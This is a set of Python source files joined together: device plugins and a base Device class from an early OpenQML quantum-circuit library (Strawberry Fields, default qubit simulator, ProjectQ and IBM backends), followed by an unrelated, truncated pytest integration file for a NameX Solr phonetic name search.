from strawberryfields.ops import (BSgate, CKgate, CXgate, CZgate, Dgate, Fouriergate,
                                  Kgate, Pgate, Rgate, S2gate, Sgate, Vgate, Xgate, Zgate)
# import measurements
from strawberryfields.ops import (MeasureFock, MeasureHeterodyne, MeasureHomodyne)


from ._version import __version__


operator_map = {
    'CoherentState': Coherent,
    'DisplacedSqueezed': DisplacedSqueezed,
    'SqueezedState': Squeezed,
    'ThermalState': Thermal,
    'GaussianState': Gaussian,
    'Beamsplitter': BSgate,
    'ControlledAddition': CXgate,
    'ControlledPhase': CZgate,
    'Displacement': Dgate,
    'QuadraticPhase': Pgate,
    'Rotation': Rgate,
    'TwoModeSqueezing': S2gate,
    'Squeeze': Sgate,
    # 'XDisplacement': Xgate,
    # 'PDisplacement': Zgate,
    # 'MeasureHomodyne': MeasureHomodyne,
    # 'MeasureHeterodyne': MeasureHeterodyne
}



class StrawberryFieldsGaussian(Device):
    """StrawberryFields Gaussian device for OpenQML.

    wires (int): the number of modes to initialize the device in.
    hbar (float): the convention chosen in the canonical commutation
        relation [x, p] = i hbar. The default value is hbar=2.
    """
    name = 'Strawberry Fields OpenQML plugin'
    short_name = 'strawberryfields.fock'
    api_version = '0.1.0'
    version = __version__
    author = 'Josh Izaac'
    _gates = set(operator_map.keys())
    _observables = {'Fock', 'X', 'P', 'Homodyne', 'Heterodyne'}
    _circuits = {}

    def __init__(self, wires, *, shots=0, hbar=2):
        self.wires = wires
        self.hbar = hbar
        self.eng = None
        self.state = None
        super().__init__(self.short_name, shots)

    def execute(self):                    
        """Apply the queued operations to the device, and measure the expectation."""
        if self.eng:
            self.eng.reset()
            self.reset()

        self.eng, q = sf.Engine(self.wires, hbar=self.hbar)

        with self.eng:
            for operation in self._queue:
                if operation.name not in operator_map:
                    raise DeviceError("{} not supported by device {}".format(operation.name, self.short_name))

                p = [x.val if isinstance(x, Variable) else x for x in operation.params]
                op = operator_map[operation.name](*p)
                if isinstance(operation.wires, int):
                    op | q[operation.wires]
                else:
                    op | [q[i] for i in operation.wires]

        self.state = self.eng.run('gaussian')

        # calculate expectation value
        reg = self._observe.wires
        if self._observe.name == 'Fock':
            ex = self.state.mean_photon(reg)
            var = 0
        elif self._observe.name == 'X':
            ex, var = self.state.quad_expectation(reg, 0)
        elif self._observe.name == 'P':
            ex, var = self.state.quad_expectation(reg, np.pi/2)
        elif self._observe.name == 'Homodyne':
            ex, var = self.state.quad_expectation(reg, *self._observe.params)
        elif self._observe.name == 'Displacement':
            ex = self.state.displacement(modes=reg)

        if self.shots != 0:
            # estimate the expectation value
            # use central limit theorem, sample normal distribution once, only ok
            # if shots is large (see https://en.wikipedia.org/wiki/Berry%E2%80%93Esseen_theorem)
            ex = np.random.normal(ex, np.sqrt(var / self.shots))

        self._out = ex

    def reset(self):
        """Reset the device"""
        if self.eng is not None:
            self.eng = None
            self.state = None

# Copyright 2018 Xanadu Quantum Technologies Inc.

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

#     http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""This module contains the device class and context manager"""

import abc
import logging


logging.getLogger()


class MethodFactory(type):
    """Metaclass that allows derived classes to dynamically instantiate
    new objects based on undefined methods. The dynamic methods pass their arguments
    directly to __init__ of the inheriting class."""
    def __getattr__(cls, name):
        """Get the attribute call via name"""
        def new_object(*args, **kwargs):
            """Return a new object of the same class, passing the attribute name
            as the first parameter, along with any additional parameters."""
            return cls(name, *args, **kwargs)
        return new_object


class DeviceError(Exception):
    """Exception raised by a :class:`Device` when it encounters an illegal
    operation in the quantum circuit.
    """
    pass


class Device(abc.ABC):
    """Abstract base class for devices."""
    _current_context = None
    name = ''          #: str: official device plugin name
    short_name = ''    #: str: name used to load device plugin
    api_version = ''   #: str: version of OpenQML for which the plugin was made
    version = ''       #: str: version of the device plugin itself
    author = ''        #: str: plugin author(s)
    _capabilities = {} #: dict[str->*]: plugin capabilities
    _gates = {}        #: dict[str->GateSpec]: specifications for supported gates
    _observables = {}  #: dict[str->GateSpec]: specifications for supported observables
    _circuits = {}     #: dict[str->Circuit]: circuit templates associated with this API class

    def __init__(self, name, shots):
        self.name = name # the name of the device

        # number of circuit evaluations used to estimate
        # expectation values of observables. 0 means the exact ev is returned.
        self.shots = shots

        self._out = None  # this attribute stores the expectation output
        self._queue = []  # this list stores the operations to be queued to the device
        self._observe = None # the measurement operation to be performed

    def __repr__(self):
        """String representation."""
        return self.__module__ +'.' +self.__class__.__name__ +'\nInstance: ' +self.name

    def __str__(self):
        """Verbose string representation."""
        return self.__repr__() +'\nName: ' +self.name +'\nAPI version: ' +self.api_version\
            +'\nPlugin version: ' +self.version +'\nAuthor: ' +self.author +'\n'

    def __enter__(self):
        if Device._current_context is None:
            Device._current_context = self
            self.reset()
        else:
            raise DeviceError('Only one device can be active at a time.')
        return self

    def __exit__(self, exc_type, exc_value, tb):
        if self._observe is None:
            raise DeviceError('A qfunc must always conclude with a classical expectation value.')
        Device._current_context = None
        self.execute()

    @property
    def gates(self):
        """Get the supported gate set.

        Returns:
          dict[str->GateSpec]:
        """
        return self._gates

    @property
    def observables(self):
        """Get the supported observables.

        Returns:
          dict[str->GateSpec]:
        """
        return self._observables

    @property
    def templates(self):
        """Get the predefined circuit templates.

        .. todo:: rename to circuits?

        Returns:
          dict[str->Circuit]: circuit templates
        """
        return self._circuits

    @property
    def result(self):
        """Get the circuit result.

        Returns:
            float or int
        """
        return self._out

    @classmethod
    def capabilities(cls):
        """Get the other capabilities of the plugin.

        Measurements, batching etc.

        Returns:
          dict[str->*]: results
        """
        return cls._capabilities

    @abc.abstractmethod                    
    def execute(self):
        """Apply the queued operations to the device, and measure the expectation."""
        raise NotImplementedError

    @abc.abstractmethod                    
    def reset(self):
        """Reset the backend state.

        After the reset the backend should be as if it was just constructed.
        Most importantly the quantum state is reset to its initial value.
        """
        raise NotImplementedError

# Copyright 2018 Xanadu Quantum Technologies Inc.

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

#     http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""This module contains the device class and context manager"""
import numpy as np
from scipy.linalg import expm, eigh

import openqml as qm
from openqml import Device, DeviceError, qfunc, QNode, Variable, __version__


# tolerance for numerical errors
tolerance = 1e-10


#========================================================
#  utilities
#========================================================

def spectral_decomposition_qubit(A):
    r"""Spectral decomposition of a 2*2 Hermitian matrix.

    Args:
      A (array): 2*2 Hermitian matrix

    Returns:
      (vector[float], list[array[complex]]): (a, P): eigenvalues and hermitian projectors
        such that :math:`A = \sum_k a_k P_k`.
    """
    d, v = eigh(A)
    P = []
    for k in range(2):
        temp = v[:, k]
        P.append(np.outer(temp.conj(), temp))
    return d, P


#========================================================
#  fixed gates
#========================================================

I = np.eye(2)
# Pauli matrices
X = np.array([[0, 1], [1, 0]])
Y = np.array([[0, -1j], [1j, 0]])
Z = np.array([[1, 0], [0, -1]])
CNOT = np.array([[1, 0, 0, 0], [0, 1, 0, 0], [0, 0, 0, 1], [0, 0, 1, 0]])
SWAP = np.array([[1, 0, 0, 0], [0, 0, 1, 0], [0, 1, 0, 0], [0, 0, 0, 1]])


#========================================================
#  parametrized gates
#========================================================


def frx(theta):
    r"""One-qubit rotation about the x axis.

    Args:
        theta (float): rotation angle
    Returns:
        array: unitary 2x2 rotation matrix :math:`e^{-i \sigma_x \theta/2}`
    """
    return expm(-1j * theta/2 * X)


def fry(theta):
    r"""One-qubit rotation about the y axis.

    Args:
        theta (float): rotation angle
    Returns:
        array: unitary 2x2 rotation matrix :math:`e^{-i \sigma_y \theta/2}`
    """
    return expm(-1j * theta/2 * Y)


def frz(theta):
    r"""One-qubit rotation about the z axis.

    Args:
        theta (float): rotation angle
    Returns:
        array: unitary 2x2 rotation matrix :math:`e^{-i \sigma_z \theta/2}`
    """
    return expm(-1j * theta/2 * Z)


def fr3(a, b, c):
    r"""Arbitrary one-qubit rotation using three Euler angles.

    Args:
        a,b,c (float): rotation angles
    Returns:
        array: unitary 2x2 rotation matrix rz(c) @ ry(b) @ rz(a)
    """
    return frz(c) @ (fry(b) @ frz(a))


#========================================================
#  Arbitrary states and operators
#========================================================

def ket(*args):
    r"""Input validation for an arbitary state vector.

    Args:
        args (array): NumPy array.

    Returns:
        array: normalised array.
    """
    state = np.asarray(args)
    return state/np.linalg.norm(state)


def unitary(*args):
    r"""Input validation for an arbitary unitary operation.

    Args:
        args (array): square unitary matrix.

    Returns:
        array: square unitary matrix.
    """
    U = np.asarray(args[0])

    if U.shape[0] != U.shape[1]:
        raise ValueError("Operator must be a square matrix.")

    if not np.allclose(U @ U.conj().T, np.identity(U.shape[0]), atol=tolerance):
        raise ValueError("Operator must be unitary.")

    return U


def hermitian(*args):
    r"""Input validation for an arbitary Hermitian observable.

    Args:
        args (array): square hermitian matrix.

    Returns:
        array: square hermitian matrix.
    """
    A = np.asarray(args[0])

    if A.shape[0] != A.shape[1]:
        raise ValueError("Observable must be a square matrix.")

    if not np.allclose(A, A.conj().T, atol=tolerance):
        raise ValueError("Observable must be Hermitian.")
    return A


#========================================================
#  operator map
#========================================================


operator_map = {
    'QubitStateVector': ket,
    'QubitUnitary': unitary,
    'Hermitian': hermitian,
    'Identity': I,
    'PauliX': X,
    'PauliY': Y,
    'PauliZ': Z,
    'CNOT': CNOT,
    'SWAP': SWAP,
    'RX': frx,
    'RY': fry,
    'RZ': frz,
    'Rot': fr3
}


#========================================================
#  device
#========================================================


class DefaultQubit(Device):
    """Default qubit device for OpenQML.

    wires (int): the number of modes to initialize the device in.
    cutoff (int): the Fock space truncation. Must be specified before
        applying a qfunc.
    hbar (float): the convention chosen in the canonical commutation
        relation [x, p] = i hbar. The default value is hbar=2.
    """
    name = 'Default OpenQML plugin'
    short_name = 'default.qubit'
    api_version = '0.1.0'
    version = '0.1.0'
    author = 'Xanadu Inc.'
    _gates = set(operator_map.keys())
    _observables = {}
    _circuits = {}

    def __init__(self, wires, *, shots=0):
        self.wires = wires
        self.eng = None
        self._state = None
        super().__init__(self.short_name, shots)

    def execute(self):                    
        """Apply the queued operations to the device, and measure the expectation."""
        if self._state is None:
            # init the state vector to |00..0>
            self._state = np.zeros(2**self.wires, dtype=complex)
            self._state[0] = 1
            self._out = np.full(self.wires, np.nan)

        # apply unitary operations U
        for operation in self._queue:
            if operation.name == 'QubitStateVector':
                state = np.asarray(operation.params[0])
                if state.ndim == 1 and state.shape[0] == 2**self.wires:
                    self._state = state
                else:
                    raise ValueError('State vector must be of length 2**wires.')
                continue

            U = DefaultQubit._get_operator_matrix(operation)

            if len(operation.wires) == 1:
                U = self.expand_one(U, operation.wires)
            elif len(operation.wires) == 2:
                U = self.expand_two(U, operation.wires)
            else:
                raise ValueError('This plugin supports only one- and two-qubit gates.')
            self._state = U @ self._state

        # measurement/expectation value <psi|A|psi>
        A = DefaultQubit._get_operator_matrix(self._observe)
        if self.shots == 0:
            # exact expectation value
            ev = self.ev(A, [self._observe.wires])
        else:
            # estimate the ev
            if 0:
                # use central limit theorem, sample normal distribution once, only ok if n_eval is large (see https://en.wikipedia.org/wiki/Berry%E2%80%93Esseen_theorem)
                ev = self.ev(A, self._observe.wires)
                var = self.ev(A**2, self._observe.wires) - ev**2  # variance
                ev = np.random.normal(ev, np.sqrt(var / self.shots))
            else:
                # sample Bernoulli distribution n_eval times / binomial distribution once
                a, P = spectral_decomposition_qubit(A)
                p0 = self.ev(P[0], self._observe.wires)  # probability of measuring a[0]
                n0 = np.random.binomial(self.shots, p0)
                ev = (n0*a[0] +(self.shots-n0)*a[1]) / self.shots

        self._out = ev  # store the result

    @classmethod
    def _get_operator_matrix(cls, A):
        """Get the operator matrix for a given operation.

        Args:
            A (openqml.Operation or openqml.Expectation): operation/observable.

        Returns:
            array: matrix representation.
        """
        if A.name not in operator_map:
            raise DeviceError("{} not supported by device {}".format(A.name, cls.short_name))

        if not callable(operator_map[A.name]):
            return operator_map[A.name]

        # unpack variables
        p = [x.val if isinstance(x, Variable) else x for x in A.params]
        return operator_map[A.name](*p)

    def ev(self, A, wires):
        r"""Expectation value of a one-qubit observable in the current state.

        Args:
          A (array): 2*2 hermitian matrix corresponding to the observable
          wires (Sequence[int]): target subsystem

        Returns:
          float: expectation value :math:`\expect{A} = \bra{\psi}A\ket{\psi}`
        """
        if A.shape != (2, 2):
            raise ValueError('2x2 matrix required.')

        A = self.expand_one(A, wires)
        expectation = np.vdot(self._state, A @ self._state)

        if np.abs(expectation.imag) > tolerance:
            log.warning('Nonvanishing imaginary part {} in expectation value.'.format(expectation.imag))
        return expectation.real

    def reset(self):
        """Reset the device"""
        self._state  = None  #: array: state vector
        self._out = None  #: array: measurement results

    def expand_one(self, U, wires):
        """Expand a one-qubit operator into a full system operator.

        Args:
          U (array): 2*2 matrix
          wires (Sequence[int]): target subsystem

        Returns:
          array: 2^n*2^n matrix
        """
        if U.shape != (2, 2):
            raise ValueError('2x2 matrix required.')
        if len(wires) != 1:
            raise ValueError('One target subsystem required.')
        wires = wires[0]
        before = 2**wires
        after  = 2**(self.wires-wires-1)
        U = np.kron(np.kron(np.eye(before), U), np.eye(after))
        return U

    def expand_two(self, U, wires):
        """Expand a two-qubit operator into a full system operator.

        Args:
          U (array): 4x4 matrix
          wires (Sequence[int]): two target subsystems (order matters!)

        Returns:
          array: 2^n*2^n matrix
        """
        if U.shape != (4, 4):
            raise ValueError('4x4 matrix required.')
        if len(wires) != 2:
            raise ValueError('Two target subsystems required.')
        wires = np.asarray(wires)
        if np.any(wires < 0) or np.any(wires >= self.wires) or wires[0] == wires[1]:
            raise ValueError('Bad target subsystems.')

        a = np.min(wires)
        b = np.max(wires)
        n_between = b-a-1  # number of qubits between a and b
        # dimensions of the untouched subsystems
        before  = 2**a
        after   = 2**(self.wires-b-1)
        between = 2**n_between

        U = np.kron(U, np.eye(between))
        # how U should be reordered
        if wires[0] < wires[1]:
            p = [0, 2, 1]
        else:
            p = [1, 2, 0]
        dim = [2, 2, between]
        p = np.array(p)
        perm = np.r_[p, p+3]
        # reshape U into another array which has one index per subsystem, permute dimensions, back into original-shape array
        temp = np.prod(dim)
        U = U.reshape(dim * 2).transpose(perm).reshape([temp, temp])
        U = np.kron(np.kron(np.eye(before), U), np.eye(after))
        return U


#====================
# Default circuits
#====================


dev = DefaultQubit(wires=2)

def node(x, y, z):
    qm.RX(x, [0])
    qm.CNOT([0, 1])
    qm.RY(-1.6, [0])
    qm.RY(y, [1])
    qm.CNOT([1, 0])
    qm.RX(z, [0])
    qm.CNOT([0, 1])
    qm.expectation.Hermitian(np.array([[0, 1], [1, 0]]), 0)

circuits = {'demo_ev': QNode(node, dev)}

# Copyright 2018 Xanadu Quantum Technologies Inc.

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

#     http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
r"""
ProjectQ plugin
========================

**Module name:** :mod:`openqml.plugins.projectq`

.. currentmodule:: openqml.plugins.projectq

This plugin provides the interface between OpenQML and ProjecQ.
It enables OpenQML to optimize quantum circuits simulable with ProjectQ.

ProjecQ supports several different backends. Of those, the following are useful in the current context:

- projectq.backends.Simulator([gate_fusion, ...])	Simulator is a compiler engine which simulates a quantum computer using C++-based kernels.
- projectq.backends.ClassicalSimulator()	        A simple introspective simulator that only permits classical operations.
- projectq.backends.IBMBackend([use_hardware, ...])	The IBM Backend class, which stores the circuit, transforms it to JSON QASM, and sends the circuit through the IBM API.

See PluginAPI._capabilities['backend'] for a list of backend options.

Functions
---------

.. autosummary::
   init_plugin

Classes
-------

.. autosummary::
   Gate
   Observable
   PluginAPI

----
"""
import logging as log
import numpy as np
from numpy.random import (randn,)
from openqml import Device, DeviceError
from openqml import Variable

import projectq as pq
import projectq.setups.ibm #todo only import this if necessary

# import operations
from projectq.ops import (HGate, XGate, YGate, ZGate, SGate, TGate, SqrtXGate, SwapGate, SqrtSwapGate, Rx, Ry, Rz, R)
from .ops import (CNOT, CZ, Toffoli, AllZGate, Rot, Hermitian)

from ._version import __version__


operator_map = {
    'PauliX': XGate,
    'PauliY': YGate,
    'PauliZ': ZGate,
    'CNOT': CNOT,
    'CZ': CZ,
    'SWAP': SwapGate,
    'RX': Rx,
    'RY': Ry,
    'RZ': Rz,
    'Rot': Rot,
    #'PhaseShift': #todo: implement
    #'QubitStateVector': #todo: implement
    #'QubitUnitary': #todo: implement
    #: H, #todo: implement
    #: S, #todo: implement
    #: T, #todo: implement
    #: SqrtX, #todo: implement
    #: SqrtSwap, #todo: implement
    #: R, #todo: implement
    #'AllPauliZ': AllZGate, #todo: implement
    #'Hermitian': #todo: implement
}

class ProjectQDevice(Device):
    """ProjectQ device for OpenQML.

    Args:
       wires (int): The number of qubits of the device.

    Keyword Args for Simulator backend:
      gate_fusion (bool): If True, gates are cached and only executed once a certain gate-size has been reached (only has an effect for the c++ simulator).
      rnd_seed (int): Random seed (uses random.randint(0, 4294967295) by default).

    Keyword Args for IBMBackend backend:
      use_hardware (bool): If True, the code is run on the IBM quantum chip (instead of using the IBM simulator)
      num_runs (int): Number of runs to collect statistics. (default is 1024)
      verbose (bool): If True, statistics are printed, in addition to the measurement result being registered (at the end of the circuit).
      user (string): IBM Quantum Experience user name
      password (string): IBM Quantum Experience password
      device (string): Device to use (ibmqx4, or ibmqx5) if use_hardware is set to True. Default is ibmqx4.
      retrieve_execution (int): Job ID to retrieve instead of re-running the circuit (e.g., if previous run timed out).
    """
    name = 'ProjectQ OpenQML plugin'
    short_name = 'projectq'
    api_version = '0.1.0'
    plugin_version = __version__
    author = 'Christian Gogolin'
    _capabilities = {'backend': list(["Simulator", "ClassicalSimulator", "IBMBackend"])}

    def __init__(self, wires, **kwargs):
        kwargs.setdefault('shots', 0)
        super().__init__(self.short_name, kwargs['shots'])

        # translate some aguments
        for k,v in {'log':'verbose'}.items():
            if k in kwargs:
                kwargs.setdefault(v, kwargs[k])

        # clean some arguments
        if 'num_runs' in kwargs:
            if isinstance(kwargs['num_runs'], int) and kwargs['num_runs']>0:
                self.n_eval = kwargs['num_runs']
            else:
                self.n_eval = 0
                del(kwargs['num_runs'])

        self.wires = wires
        self.backend = kwargs['backend']
        del(kwargs['backend'])
        self.kwargs = kwargs
        self.eng = None
        self.reg = None
        #self.reset() #the actual initialization is done in reset(), but we don't need to call this manually as Device does it for us during __enter__()

    def reset(self):
        self.reg = self.eng.allocate_qureg(self.wires)

    def __repr__(self):
        return super().__repr__() +'Backend: ' +self.backend +'\n'

    def __str__(self):
        return super().__str__() +'Backend: ' +self.backend +'\n'

    # def __del__(self):
    #     self._deallocate()

    def execute(self):                    
        """ """                    
        #todo: I hope this function will become superfluous, see https://github.com/XanaduAI/openqml/issues/18
        self._out = self.execute_queued()                    

    def execute_queued(self):
        """Apply the queued operations to the device, and measure the expectation."""
        #expectation_values = {}
        for operation in self._queue:
            if operation.name not in operator_map:
                raise DeviceError("{} not supported by device {}".format(operation.name, self.short_name))

            par = [x.val if isinstance(x, Variable) else x for x in operation.params]
            #expectation_values[tuple(operation.wires)] = self.apply(operator_map[operation.name](*p), self.reg, operation.wires)
            self.apply(operation.name, operation.wires, *par)

        result = self.expectation(self._observe.name, self._observe.wires)
        self._deallocate()
        return result

        # if self._observe.wires is not None:
        #     if isinstance(self._observe.wires, int):
        #         return expectation_values[tuple([self._observe.wires])]
        #     else:
        #         return np.array([expectation_values[tuple([idx])] for idx in self._observe.wires if tuple([idx]) in expectation_values])

    def apply(self, gate_name, wires, *par):
        if gate_name not in self._gates:
            raise ValueError('Gate {} not supported on this backend'.format(gate))

        gate = operator_map[gate_name](*par)
        if isinstance(wires, int):
            gate | self.reg[wires]
        else:
            gate | tuple([self.reg[i] for i in wires])

    def expectation(self, observable, wires):
        raise NotImplementedError("expectation() is not yet implemented for this backend")

    def shutdown(self):
        """Shutdown.

        """
        pass

    def _deallocate(self):
        """Deallocate all qubits to make ProjectQ happy

        See also: https://github.com/ProjectQ-Framework/ProjectQ/issues/2

        Drawback: This is probably rather resource intensive.
        """
        if self.eng is not None and self.backend == 'Simulator' or self.backend == 'IBMBackend':
            pq.ops.All(pq.ops.Measure) | self.reg #avoid an unfriendly error message: https://github.com/ProjectQ-Framework/ProjectQ/issues/2

    def _deallocate2(self):
        """Another proposal for how to deallocate all qubits to make ProjectQ happy

        Unsuitable because: Produces a segmentation fault.
        """
        if self.eng is not None and self.backend == 'Simulator' or self.backend == 'IBMBackend':
             for qubit in self.reg:
                 self.eng.deallocate_qubit(qubit)

    def _deallocate3(self):
        """Another proposal for how to deallocate all qubits to make ProjectQ happy

        Unsuitable because: Throws an error if the probability for the given collapse is 0.
        """
        if self.eng is not None and self.backend == 'Simulator' or self.backend == 'IBMBackend':
            self.eng.flush()
            self.eng.backend.collapse_wavefunction(self.reg, [0 for i in range(len(self.reg))])


    # def requires_credentials(self):
    #     """Check whether this plugin requires credentials
    #     """
    #     if self.backend == 'IBMBackend':
    #         return True
    #     else:
    #         return False


    def filter_kwargs_for_backend(self, kwargs):
        return { key:value for key,value in kwargs.items() if key in self._backend_kwargs }


class ProjectQSimulator(ProjectQDevice):
    """ProjectQ Simulator device for OpenQML.

    Args:
       wires (int): The number of qubits of the device.

    Keyword Args:
      gate_fusion (bool): If True, gates are cached and only executed once a certain gate-size has been reached (only has an effect for the c++ simulator).
      rnd_seed (int): Random seed (uses random.randint(0, 4294967295) by default).
    """

    short_name = 'projectq.simulator'
    _gates = set(operator_map.keys())
    _observables = set([ key for (key,val) in operator_map.items() if val in [XGate, YGate, ZGate, AllZGate, Hermitian] ])
    _circuits = {}
    _backend_kwargs = ['gate_fusion', 'rnd_seed']

    def __init__(self, wires, **kwargs):
        kwargs['backend'] = 'Simulator'
        super().__init__(wires, **kwargs)

    def reset(self):
        """Resets the engine and backend

        After the reset the Device should be as if it was just constructed.
        Most importantly the quantum state is reset to its initial value.
        """
        backend = pq.backends.Simulator(**self.filter_kwargs_for_backend(self.kwargs))
        self.eng = pq.MainEngine(backend)
        super().reset()


    def expectation(self, observable, wires):
        self.eng.flush(deallocate_qubits=False)
        if observable == 'PauliX' or observable == 'PauliY' or observable == 'PauliZ':
            expectation_value = self.eng.backend.get_expectation_value(pq.ops.QubitOperator(str(observable)[-1]+'0'), self.reg)
            variance = 1 - expectation_value**2
        elif observable == 'AllPauliZ':
            expectation_value = [ self.eng.backend.get_expectation_value(pq.ops.QubitOperator("Z"+'0'), [qubit]) for qubit in self.reg]
            variance = [1 - e**2 for e in expectation_value]
        else:
            raise NotImplementedError("Estimation of expectation values not yet implemented for the observable {} in backend {}.".format(observable, self.backend))

        return expectation_value#, variance


class ProjectQClassicalSimulator(ProjectQDevice):
    """ProjectQ ClassicalSimulator device for OpenQML.

    Args:
       wires (int): The number of qubits of the device.
    """

    short_name = 'projectq.classicalsimulator'
    _gates = set([ key for (key,val) in operator_map.items() if val in [XGate, CNOT] ])
    _observables = set([ key for (key,val) in operator_map.items() if val in [ZGate, AllZGate] ])
    _circuits = {}
    _backend_kwargs = []

    def __init__(self, wires, **kwargs):
        kwargs['backend'] = 'ClassicalSimulator'
        super().__init__(wires, **kwargs)

    def reset(self):
        """Resets the engine and backend

        After the reset the Device should be as if it was just constructed.
        Most importantly the quantum state is reset to its initial value.
        """
        backend = pq.backends.ClassicalSimulator(**self.filter_kwargs_for_backend(self.kwargs))
        self.eng = pq.MainEngine(backend)
        super().reset()

class ProjectQIBMBackend(ProjectQDevice):
    """ProjectQ IBMBackend device for OpenQML.

    Args:
       wires (int): The number of qubits of the device.

    Keyword Args:
      use_hardware (bool): If True, the code is run on the IBM quantum chip (instead of using the IBM simulator)
      num_runs (int): Number of runs to collect statistics. (default is 1024)
      verbose (bool): If True, statistics are printed, in addition to the measurement result being registered (at the end of the circuit).
      user (string): IBM Quantum Experience user name
      password (string): IBM Quantum Experience password
      device (string): Device to use (ibmqx4, or ibmqx5) if use_hardware is set to True. Default is ibmqx4.
      retrieve_execution (int): Job ID to retrieve instead of re-running the circuit (e.g., if previous run timed out).
    """

    short_name = 'projectq.ibmbackend'
    _gates = set([ key for (key,val) in operator_map.items() if val in [HGate, XGate, YGate, ZGate, SGate, TGate, SqrtXGate, SwapGate, Rx, Ry, Rz, R, CNOT, CZ] ])
    _observables = set([ key for (key,val) in operator_map.items() if val in [ZGate, AllZGate] ])
    _circuits = {}
    _backend_kwargs = ['use_hardware', 'num_runs', 'verbose', 'user', 'password', 'device', 'retrieve_execution']

    def __init__(self, wires, **kwargs):
        # check that necessary arguments are given
        if 'user' not in kwargs:
            raise ValueError('An IBM Quantum Experience user name specified via the "user" keyword argument is required')
        if 'password' not in kwargs:
            raise ValueError('An IBM Quantum Experience password specified via the "password" keyword argument is required')

        kwargs['backend'] = 'IBMBackend'
        #kwargs['verbose'] = True #todo: remove when done testing
        #kwargs['log'] = True #todo: remove when done testing
        #kwargs['use_hardware'] = False #todo: remove when done testing
        #kwargs['num_runs'] = 3 #todo: remove when done testing
        super().__init__(wires, **kwargs)

    def reset(self):
        """Resets the engine and backend

        After the reset the Device should be as if it was just constructed.
        Most importantly the quantum state is reset to its initial value.
        """
        backend = pq.backends.IBMBackend(**self.filter_kwargs_for_backend(self.kwargs))
        self.eng = pq.MainEngine(backend, engine_list=pq.setups.ibm.get_engine_list())
        super().reset()

    def expectation(self, observable, wires):
        pq.ops.R(0) | self.reg[0]# todo:remove this once https://github.com/ProjectQ-Framework/ProjectQ/issues/259 is resolved

        pq.ops.All(pq.ops.Measure) | self.reg
        self.eng.flush()

        if observable == 'PauliZ':
            probabilities = self.eng.backend.get_probabilities([self.reg[wires]])
            #print("IBM probabilities="+str(probabilities))
            if '1' in probabilities:
                expectation_value = 2*probabilities['1']-1
            else:
                expectation_value = -(2*probabilities['0']-1)
            variance = 1 - expectation_value**2
        elif observable == 'AllPauliZ':
            probabilities = self.eng.backend.get_probabilities(self.reg)
            #print("IBM all probabilities="+str(probabilities))
            expectation_value = [ ((2*sum(p for (state,p) in probabilities.items() if state[i] == '1')-1)-(2*sum(p for (state,p) in probabilities.items() if state[i] == '0')-1)) for i in range(len(self.reg)) ]
            variance = [1 - e**2 for e in expectation_value]
        else:
            raise NotImplementedError("Estimation of expectation values not yet implemented for the observable {} in backend {}.".format(observable, self.backend))

        return expectation_value#, variance

from namex.models import User
import requests
import json
import pytest
from tests.python import integration_solr, integration_synonym_api
import urllib
from hamcrest import *


token_header = {
                "alg": "RS256",
                "typ": "JWT",
                "kid": "flask-jwt-oidc-test-client"
               }
claims = {
            "iss": "https://sso-dev.pathfinder.gov.bc.ca/auth/realms/sbc",
            "sub": "43e6a245-0bf7-4ccf-9bd0-e7fb85fd18cc",
            "aud": "NameX-Dev",
            "exp": 31531718745,
            "iat": 1531718745,
            "jti": "flask-jwt-oidc-test-support",
            "typ": "Bearer",
            "username": "test-user",
            "realm_access": {
                "roles": [
                    "{}".format(User.EDITOR),
                    "{}".format(User.APPROVER),
                    "viewer",
                    "user"
                ]
            }
         }


@pytest.fixture(scope="session", autouse=True)
def reload_schema(solr):
    url = solr + '/solr/admin/cores?action=RELOAD&core=possible.conflicts&wt=json'
    r = requests.get(url)

    assert r.status_code == 200


@integration_solr
def test_solr_available(solr, app, client, jwt):
    url = solr + '/solr/possible.conflicts/admin/ping'
    r = requests.get(url)

    assert r.status_code == 200


def clean_database(solr):
    url = solr + '/solr/possible.conflicts/update?commit=true'
    headers = {'content-type': 'text/xml'}
    data = '<delete><query>id:*</query></delete>'
    r = requests.post(url, headers=headers, data=data)

    assert r.status_code == 200


def seed_database_with(solr, name, id='1', source='CORP'):
    url = solr + '/solr/possible.conflicts/update?commit=true'
    headers = {'content-type': 'application/json'}
    data = '[{"source":"' + source + '", "name":"' + name + '", "id":"'+ id +'"}]'
    r = requests.post(url, headers=headers, data=data)

    assert r.status_code == 200


def verify(data, expected):

    print("Expected: ", expected)

    # remove the search divider(s): ----<query term>
    actual = [{ 'name':doc['name_info']['name'] } for doc in data['names']]

    print("Actual: ", actual)

    assert_that(len(actual), equal_to(len(expected)))
    for i in range(len(actual)):
        assert_that(actual[i]['name'], equal_to(expected[i]['name']))


def verify_results(client, jwt, query, expected):
    data = search(client, jwt, query)
    verify(data, expected)


def search(client, jwt, query):
    token = jwt.create_jwt(claims, token_header)
    headers = {'Authorization': 'Bearer ' + token}
    url = '/api/v1/requests/phonetics/' + urllib.parse.quote(query) + '/*'
    print(url)
    rv = client.get(url, headers=headers)

    assert rv.status_code == 200
    return json.loads(rv.data)


@integration_synonym_api
@integration_solr
def test_all_good(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'GOLDSTREAM ELECTRICAL LTD')
    verify_results(client, jwt,
       query='GOLDSMITHS',
       expected=[
           {'name': '----GOLDSMITHS'},
           {'name': 'GOLDSTREAM ELECTRICAL LTD'}
       ]
    )


@pytest.mark.skip(reason="Rhyming not implemented yet")
@integration_synonym_api
@integration_solr
def test_sounds_like(solr, client, jwt, app):
    clean_database(solr)
